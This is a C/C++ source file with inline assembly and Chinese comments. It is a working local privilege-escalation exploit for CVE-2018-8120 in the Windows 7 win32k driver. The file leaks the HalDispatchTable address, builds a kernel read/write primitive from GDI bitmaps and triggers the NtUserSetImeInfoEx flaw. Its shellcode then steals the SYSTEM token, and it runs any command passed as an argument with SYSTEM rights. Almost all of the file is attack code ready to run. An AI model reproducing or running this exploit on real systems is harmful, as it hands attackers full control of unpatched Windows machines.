#pragma once
#include <iostream>
#include <windows.h>
#include <Psapi.h>
#include <intrin.h>  

#pragma comment(lib, "Psapi.lib")


DWORD g_EPROCESS_TokenOffset = 0xf8;
DWORD g_EPROCESS = 0x50;
DWORD g_flink = 0xb8;
DWORD g_PID = 0xb4;
DWORD g_kthread = 0x124;

__declspec(noinline) int shellcode()
{
	__asm {
		pushad;// 保存寄存器所有状态到堆栈
		mov edx, g_kthread;
		mov eax, fs: [edx] ;// Get nt!_KPCR.PcrbData.CurrentThread
		mov edx, g_EPROCESS;
		mov eax, [eax + edx];// Get nt!_KTHREAD.ApcState.Process
		mov ecx, eax;// Copy current _EPROCESS structure
		mov esi, g_EPROCESS_TokenOffset;
		mov edx, 0x4;// WIN 7 SP1 SYSTEM Process PID = 0x4
		mov edi, g_flink;
		mov ebx, g_PID;
	SearchSystemPID:
		mov eax, [eax + edi];// Get nt!_EPROCESS.ActiveProcessLinks.Flink
		sub eax, edi;
		cmp[eax + ebx], edx;// Get nt!_EPROCESS.UniqueProcessId
		jne SearchSystemPID;

		mov edx, [eax + esi];// Get SYSTEM process nt!_EPROCESS.Token
		mov[ecx + esi], edx;// Copy nt!_EPROCESS.Token of SYSTEM to current process
		popad;// restore registers state

		// recovery
		xor eax, eax;// Set NTSTATUS SUCCEESS

	}
}




struct tagIMEINFO32
{
	unsigned int dwPrivateDataSize;
	unsigned int fdwProperty;
	unsigned int fdwConversionCaps;
	unsigned int fdwSentenceCaps;
	unsigned int fdwUICaps;
	unsigned int fdwSCSCaps;
	unsigned int fdwSelectCaps;
};


typedef struct tagIMEINFOEX
{
	HKL__* hkl;
	tagIMEINFO32 ImeInfo;
	wchar_t wszUIClass[16];
	unsigned int fdwInitConvMode;
	int fInitOpen;
	int fLoadFlag;
	unsigned int dwProdVersion;
	unsigned int dwImeWinVersion;
	wchar_t wszImeDescription[50];
	wchar_t wszImeFile[80];
	__int32 fSysWow64Only : 1;
	__int32 fCUASLayer : 1;
}IMEINFOEX, * PIMEINFOEX;

struct _HEAD
{
	void* h;
	unsigned int cLockObj;
};

struct tagKBDFILE
{
	_HEAD head;
	tagKBDFILE* pkfNext;
	void* hBase;
	void* pKbdTbl;
	unsigned int Size;
	void* pKbdNlsTbl;
	wchar_t awchDllName[32];
};


typedef struct _tagKL
{
	_HEAD head;
	_tagKL* pklNext;
	_tagKL* pklPrev;
	unsigned int dwKL_Flags;
	HKL__* hkl;
	tagKBDFILE* spkf;
	tagKBDFILE* spkfPrimary;
	unsigned int dwFontSigs;
	unsigned int iBaseCharset;
	unsigned __int16 CodePage;
	wchar_t wchDiacritic;
	tagIMEINFOEX* piiex;
	unsigned int uNumTbl;
	tagKBDFILE** pspkfExtra;
	unsigned int dwLastKbdType;
	unsigned int dwLastKbdSubType;
	unsigned int dwKLID;
}tagKL, * P_tagKL;
typedef
NTSYSAPI
NTSTATUS
(NTAPI* _NtAllocateVirtualMemory)(
	IN HANDLE               ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG                ZeroBits,
	IN OUT PULONG           RegionSize,
	IN ULONG                AllocationType,
	IN ULONG                Protect);

typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(IN ULONG   ProfileSource,
	OUT PULONG Interval);

typedef struct
{
	LPVOID pKernelAddress;
	USHORT wProcessId;
	USHORT wCount;
	USHORT wUpper;
	USHORT wType;
	LPVOID pUserAddress;
} GDICELL;


__declspec(naked) void NtUserSetImeInfoEx(PVOID tmp)
{
	_asm
	{

		mov esi, tmp;
		mov eax, 0x1226; //在sstd表中找NtUserSetIemInfoEx的索引再加0x1000 为函数地址
		mov edx, 0x7FFE0300; //Kifastcall 地址
		call dword ptr[edx];
		ret 4;
	}
}


DWORD getPEB() {
	DWORD p = (DWORD)__readfsdword(0x18);
	p = *(DWORD*)((char*)p + 0x30);
	return p;
}

DWORD getGDI() {
	DWORD gTableOffset = 0x094;
	return *(DWORD*)(getPEB() + gTableOffset);

}

PVOID getpvscan0(HANDLE h) {
	DWORD p = (getGDI()+LOWORD(h)* sizeof(GDICELL)) & 0x00000000ffffffff;
	GDICELL* c = (GDICELL*)p;
	return (char*)c->pKernelAddress + 0x30;
}




const char* DetectKernel(PDWORD offset)
{
	BOOL  pae = FALSE;
	*offset = 0;
	int tmp[4];
	RtlSecureZeroMemory(tmp, sizeof(tmp));
	__cpuid(tmp, 1);

	if (tmp[3] & 0x40)
	{
		pae = TRUE;
	}
	if (pae)
	{
		*offset = 0x9000;
		return "ntkrnlpa.exe";
	}
	else
	{
		return "ntoskrnl.exe";
	}
}
PVOID leakHal()
{

	DWORD ntoskrnlBase;
	DWORD HalDTUser, HalDTOffset;
	HMODULE userKernel;
	char* FuncAddress = 0L;

	LPVOID drivers[1024];
	DWORD cbNeeded;
	//枚举驱动设备信息
	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		if (drivers[0])
		{
			ntoskrnlBase = (DWORD)drivers[0];
		}
	}

	
	//	ntoskrnlBase = (DWORD)pModuleInfo->Modules[0].ImageBase;
	DWORD offset = 0;
	bool failback = false;
	const char* kernel = DetectKernel(&offset); //查找当前进程使用的内核模块 根据编译选项不同会编译出不同的文件
	printf("[+] Use kernel %s\n", kernel);
	userKernel = LoadLibraryExA(kernel, NULL, DONT_RESOLVE_DLL_REFERENCES); //内核模块
	if (userKernel == NULL)
	{
		printf("[-] Could not load %s , load ntoskrnl.exe instead.\n", kernel);
		userKernel = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
		failback = true;
		if (userKernel == NULL)
		{
			puts("[-] Could not load ntoskrnl.exe");
			return FALSE;
		}
	}

	HalDTUser = (DWORD)GetProcAddress(userKernel, "HalDispatchTable"); //得到HalDispatchTable函数地址
	HalDTOffset = HalDTUser - (DWORD)userKernel; 
	//函数地址等于=动态模块地址+偏移地址，如果要计算HalDispatchTable偏移地址则需要 函数地址-动态模块地址=偏移地址

	if (failback)
	{
		printf("[+] Offset1: %p\n", offset);
		return (PVOID)(ntoskrnlBase + HalDTOffset + offset);
	}
	else
	{
		printf("[+] Offset2: %p\n", offset);
		return (PVOID)(ntoskrnlBase + HalDTOffset);
	}
}

int main() {
	int argc = 0;
	wchar_t** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	fflush(stdout);
	if (argc != 2)
	{
		fflush(stdout);
		ExitProcess(0);
	}

	HMODULE hntdll = GetModuleHandle("ntdll");

	PVOID overwrite_address = (char *)leakHal();  // HalDispatchTable 计算HalDispatchTable的基地址
	int overwrite_offset = 0x4;     // QueryIntervalProfile 函数的偏移地址


	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(hntdll, "NtAllocateVirtualMemory");
	PVOID addr = (PVOID)0x100;
	DWORD size = 0x1000;
	NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	//以上申请0地址内存属于win7可以 win10不行


	//创建窗口站对象
	HWINSTA hsta = CreateWindowStation(0, 0, READ_CONTROL, 0);
	//与当前进程窗口对象关联
	SetProcessWindowStation(hsta);

	//创建两个bitmap对象
	HANDLE gManger = CreateBitmap(0x60, 1, 1, 32, NULL);
	HANDLE gWorker = CreateBitmap(0x60, 1, 1, 32, NULL);

	//得到两个bitmap中的pvscan0 因为此对象为内核对象可以操作任意长度读写
	PVOID Manage_kernel = (PVOID)getpvscan0(gManger);
	PVOID Worker_kernel = (PVOID)getpvscan0(gWorker);


	
	printf("[+] Get Manage_kernel Address at %lx,Worker_kernel Address at %lx\n", Manage_kernel, Worker_kernel);

	P_tagKL pkl = 0;
	pkl->hkl = (HKL__*)Worker_kernel; //构造零地址 中HKL对象为跳过循环
	pkl->piiex = (tagIMEINFOEX*)((char*)Manage_kernel - sizeof(PVOID)); //此处为了利用 qmemcpy 将Worker_kernel地址写进Manage_kernel地址 方便随时操作Manage_kernel来修改Worker_kernel的随意写入地址

	IMEINFOEX ime;  //此处是使用nt win32k!tagIMEINFOEX 查询到的结构
	RtlSecureZeroMemory(&ime, sizeof(IMEINFOEX)); //执行漏洞构造任意读写的gdi内核对象
	

	PVOID* p = (PVOID*)&ime;
	p[0] = (PVOID)Worker_kernel;//此处是为了跳过循环和上面的Worker_kernel地址相等
	p[1] = (PVOID)Worker_kernel;
	DWORD* pp = (DWORD*)&p[2]; //一下是为了读取其他对象不会异常 其实调用RtlSecureZeroMemory 已经初始化了所有对象
	pp[0] = 0x180;
	pp[1] = 0xabcd;
	pp[2] = 6;
	pp[3] = 0x10000;
	pp[5] = 0x4800200;


	/*DWORD* p = NULL;
	DWORD ime[0x57] = { 0x90 };
	* (p + 5) = ((DWORD)Worker_kernel + 0x10 + 0x20);
	ime[0] = ((DWORD)Worker_kernel + 0x10 + 0x20);
	*(p + 0xb) = ((DWORD)Manage_kernel + 0x10 + 0x20);

	DWORD* pp = (DWORD*)&ime[1];
	pp[0] = 0x180;
	pp[1] = 0xabcd;
	pp[2] = 6;
	pp[3] = 0x10000;
	pp[5] = 0x4800200;*/


	NtUserSetImeInfoEx((PVOID)&ime); //执行漏洞进行构造bitmap任意读写
	printf("CVE-2018-8120 Ok1\n");
	PVOID oaddr = ((char*)overwrite_address + overwrite_offset); //计算QueryIntervalProfile的地址
	PVOID pOrg = 0;
	PVOID sc = &shellcode;//拿出shellcode函数地址
	SetBitmapBits((HBITMAP)gManger, sizeof(PVOID), &oaddr);//将计算的QueryIntervalProfile地址写入到gManger的pvscan0值 而gManger的值指向的是gWorker的地址
	GetBitmapBits((HBITMAP)gWorker, sizeof(PVOID), &pOrg);//将gWorker的pvscan0的值保存在 p0rg
	SetBitmapBits((HBITMAP)gWorker, sizeof(PVOID), &sc);//再将gWorker中pvscan0指向地址的值进行修改为shellcode函数地址
	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hntdll, "NtQueryIntervalProfile"); //获取函数并转换为函数对象
	ULONG Interval = 0;
	NtQueryIntervalProfile(0x1337, &Interval);//执行shellcode
	SetBitmapBits((HBITMAP)gWorker, sizeof(PVOID), &pOrg);//将gWorker的地址值还原回来 恢复现场
	printf("CVE-2018-8120 Ok2\n");
	//shellcode已将当前进程权限改成system 后面以本程序创建的进程都会是system


	SECURITY_ATTRIBUTES		sa;
	HANDLE					hRead, hWrite;
	byte					buf[40960] = { 0 };
	STARTUPINFOW			si;
	PROCESS_INFORMATION		pi;
	DWORD					bytesRead;
	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	RtlSecureZeroMemory(&sa, sizeof(sa));
	int br = 0;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		fflush(stdout);
		fflush(stderr);
		ExitProcess(5);
	}
	wprintf(L"执行命令 %s 为 SYSTEM...\n", argv[1]);
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfoW(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	//si.lpDesktop = L"WinSta0\\Default";
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	wchar_t cmd[4096] = { 0 };
	lstrcpyW(cmd, argv[1]);
	CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	CloseHandle(hWrite);
	printf("进程pid %d!\n", pi.dwProcessId);
	while (1)
	{
		if (!ReadFile(hRead, buf + br, 4000, &bytesRead, NULL))
			break;
		br += bytesRead;
	}
	puts((char*)buf);
	fflush(stdout);
	fflush(stderr);
	CloseHandle(hRead);
	CloseHandle(pi.hProcess);
}
